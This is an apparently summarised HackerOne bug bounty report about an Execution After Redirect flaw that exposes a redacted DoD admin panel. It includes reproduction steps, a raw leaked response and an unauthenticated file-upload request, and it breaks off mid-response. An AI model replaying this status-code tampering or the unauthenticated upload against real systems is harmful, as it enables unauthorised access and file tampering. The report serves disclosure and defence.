# Unauthenticated Access to Admin Panel via Execution After Redirect (EAR)

## Metadata
- **Source:** HackerOne
- **Report:** 1394910 | https://hackerone.com/reports/1394910
- **Submitted:** 2021-11-08
- **Reporter:** palaziv
- **Program:** Undisclosed Government/DoD System
- **Bounty:** Not specified
- **Severity:** critical
- **Vuln:** Broken Authentication, Execution After Redirect (EAR), Improper Access Control, Information Disclosure
- **CVEs:** None
- **Category:** uncategorised

## Summary
The admin panel and all administrative functions are accessible without authentication due to improper HTTP redirect handling. An attacker can intercept the 302 redirect response, modify the status code to 200, and access the full admin panel HTML containing links to file upload, deletion, and modification functions. This allows complete compromise of the application's file management system.

## Attack scenario
1. Attacker navigates to the admin panel URL and intercepts the HTTP response in a proxy tool (e.g., Burp Suite)
2. Server responds with HTTP 302 Found status and Location header redirect, but includes the full admin panel HTML in the response body
3. Attacker modifies the intercepted response, changing status code from 302 to 200 OK
4. Browser renders the admin panel HTML despite the redirect header, granting access to admin functions
5. Attacker gains access to links for uploading files (s3html.php, addnewfile.php, verifyfile.php)
6. Attacker can now upload, modify, or delete files on the system without authentication

## Root cause
The application sends both a redirect directive (302 status + Location header) AND the full admin panel HTML in the same response. Client-side redirect handling allows rendering of the response body before following the redirect. The application lacks server-side authentication/authorization checks before constructing and sending the admin panel HTML.

## Attacker mindset
An attacker with network interception capabilities (MITM or local proxy) identifies that sensitive admin content is being transmitted in unauthenticated responses. By exploiting the race condition between HTTP status codes and response body rendering, they bypass the redirect mechanism. This suggests reconnaissance of HTTP response patterns and knowledge of browser/proxy behavior with redirect handling.

## Defensive takeaways
- Never include sensitive content in redirect responses; send only headers with empty/minimal body
- Implement server-side authentication checks BEFORE rendering any privileged content
- Use HTTP 303 (See Other) or 307/308 redirects appropriately and ensure clients follow redirects before rendering
- Employ Content Security Policy (CSP) headers to restrict script execution from intercepted responses
- Add anti-CSRF tokens and session validation for all admin operations
- Implement proper access control lists (ACL) at the application logic level, not just HTTP layer
- Use HSTS and certificate pinning to reduce MITM attack surface
- Conduct security review of all HTTP redirect implementations in authentication flows

## Variant hunting
Check other redirect endpoints for similar response body leakage patterns
Test other status codes (301, 303, 307, 308) to see if content is exposed with different redirect types
Look for similar patterns in logout, password reset, and account switching flows
Examine API endpoints that use HTTP redirects for OAuth/SAML authentication
Test whether other authentication bypass methods work (missing headers, null cookies, header case variations)
Investigate if other admin panels or privileged functions have same vulnerability
Check for client-side vs server-side validation gaps in authorization

## MITRE ATT&CK
- T1190
- T1199
- T1566
- T1567
- T1530

## Notes
This is a government/DoD system indicated by the 'LIMITED DISTRIBUTION' classification headers. The vulnerability is relatively straightforward to exploit, requiring only network interception capabilities. The fact that admin panel HTML is sent before redirect suggests either a legacy application or poor implementation of redirect logic. The presence of multiple admin functions (file upload, deletion, modification) indicates high impact from unauthorized access. This appears to be a teaching example or redacted report due to extensive censoring of system details.

## Full report
<details><summary>Expand</summary>

**Description:**
I discovered that the admin panel at https://████/█████ and all its functions can be accessed without authentication.

## Impact

An attacker is able to use the administrative functions in order to upload, delete or modify files.

## System Host(s)
████████

## Affected Product(s) and Version(s)
██████'s ████████ (███) Management

## CVE Numbers


## Steps to Reproduce
* Navigate to https://█████/ and click on the "█████████" button
* Notice how the application first sends an HTTP POST request to https://█████████/█████ which gets answered with a redirect to https://█████/█████ which again redirects to https://███████/█████████
* Looking at the response to https://█████████/███████ I noticed that even though the server sent back a 302 status code with a header `Location: /█████` the response was quite long
* I browsed to https://████████/████, intercepted the response in Burp, changed the status code from `302 Found` to `200 OK` and was presented with the admin panel (this kind of attack is called [Execution after Redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))). Below you can see the unmodified response containing links to the ███ Admin Functions:

```
HTTP/1.1 302 Found
Date: Mon, 08 Nov 2021 20:28:44 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: /███████
Pragma: no-cache
X-Vcap-Request-Id: f4014a06-51c2-44c3-4e4f-6db613c30484
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 4260


<table align="center" width="800" border="1" cellspacing="1"
	cellpadding="1" bgcolor="#008000">
	<tr>
		<td style="color: #FFF" ;="" align="center">LIMITED DISTRIBUTION<br> <font
			size="2px">Distribution authorized to DoD, IAW 10 U.S.C. &#167&#167
				130 &amp; 455. Release authorized to U.S. DoD contractors, IAW 48
				C.F.R. &#167 252.245-7000. <br>Refer other requests to:
				Headquarters, █████████, ATTN: Release Officer, █████████
				████████. <br>Destroy IAW DoDD 5030.59.
				Removal of this caveat is prohibited.
		</font></td>
	</tr>
</table>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang='en' xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Admin</title>
<script src="../███████p/SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
<link href="../█████████p/SpryAssets/SpryMenuBarHorizontal.css"
	rel="stylesheet" type="text/css" />
</head>

<body>
	<table align="center" bgcolor="#82F379" border="3">
		<tr>
			<td colspan="2" align="center"><img
				src="../██████p/images/███_banner_top.jpg" /></td>
		</tr>
		<tr>
			<td align="center"><br />
            ████ You are on NIPR NET RESTRICTIVE<br /></td>
		</tr>
		<tr>
			<td>
				<div align="center">
					<ul id="MenuBar1" class="MenuBarHorizontal">
						<li><a class="MenuBarItemSubmenu" href="#">Home</a></li>
						<li><a class="MenuBarItemSubmenu" href="#">███████ Admin Functions</a>
							<ul>
								<li><a href="s3html.php">UpLoad Weekly</a></li>
								<li><a href="../████p/████████/verifyfile.php">Verify File Dates</a></li>
								<li><a href="#">Add Single File</a>
									<ul>
										<li><a href="../████p/███/addnewfile.php" target="new">VDU ADD
										</a></li>
										<li><a href="../████p/████████/addvpf.php" target="new">VPF ADD</a></li>
										<li><a href="../███████p/████████/████████class.php" target="new">Change
												Classification</a></li>
										<li><a href="../██████████p/██████/███████████████">New █████</a></li>
										<li><a href="../████p/████/██████loadgraph.php" target="new">Graphic
												ADD</a></li>
										<li><a href="../███p/██████/████delgrp.php">Delete 'ALL' Graphic
												Files</a></li>
									</ul></li>
								<li><a href="#">Upload New Editions</a>
									<ul>
										<li><a href="../███p/█████/██████████loadvdu.php" target="new">Install
												New Base VDU </a></li>
										<li><a href="../█████p/█████/████████loadvpf.php" target="new">Install
												New base VPF </a></li>
										<li><a href="../█████████p/███/█████████loadtxt.php" target="new">Install/Update
												██████##.txt</a></li>
										<li><a href="../█████p/██████████/████newgraph.php" target="new">Replace
												all Graphic Files</a></li>
									</ul></li>
								<li><a href="#">Modify Single File**</a>
									<ul>
										<li><a href="../████████p/█████████/███mod.php">Modify ██████ Chart</a></li>
										<li><a href="../████p/██████████/██████████vitem.php">Modify Library Specific
												File</a></li>
										<li><a href="../███p/██████████/█████viteml.php">Stop ALL VPFS from
												being viewed from specific Region</a></li>
										<li><a href="../███p/██████/██████████graphic.php">Modify Graphic
												Specific File</a></li>
									</ul></li>
								<li><a href="../█████████p/████/██████████vpfdel.php">DELETE VPF, VDU,
										Graphics</a></li>
								<li><a href="#">Change Status of Deleted and New Records</a>
									<ul>
										<li><a href="../██████████p/███/█████deldel.php">Change Record Status
												To an ADDed or DELeted VDU Record</a></li>
									</ul></li>
								<li><a href="../█████████p/█████/████████_documentation.php">██████████
										Documentation</a></li>
							</ul></li>
						<li><a href="dssLogout.php">Logout</a></li>
					</ul>
				</div>
				<p>&nbsp;</p>
				<p>&nbsp;</p>
				<p>
					<br /> <br />
				</p>
			</td>
		</tr>
		<tr>
			<td><br /> <br /></td>
		</tr>
		<tr align="center">
		</tr>
	</table>
	<script type="text/javascript">
    var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"../SpryAssets/SpryMenuBarDownHover.gif", imgRight:"../SpryAssets/SpryMenuBarRightHover.gif"});
</script>
</body>
</html>

```

* The functions allow to upload, modify and to delete ████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://███/elist/s3html.php. Note that the request has no session cookie:

```
POST /██████████ HTTP/1.1
Host: ███
Content-Length: 899
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://█████
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT4r0MDX8IcQqr8D9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://██████████/elist/s3html.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="nNtM"

13/37
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="oNtM"

13/37
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="update"

2021-11-08
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="nxtdate"

2021-12-06
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="regionSelect"

01
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="type"

windows
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="userfile1[]"; filename="test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="buttonm"

Begin Uploads
------WebKitFormBoundaryT4r0MDX8IcQqr8D9--

```

Response:

```
HTTP/1.1 302 Found
Date: Mon, 08 Nov 2021 21:03:35 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: 404.html
Pragma: no-cache
Set-

</details>

---
*Analysed by Claude on 2026-05-24*
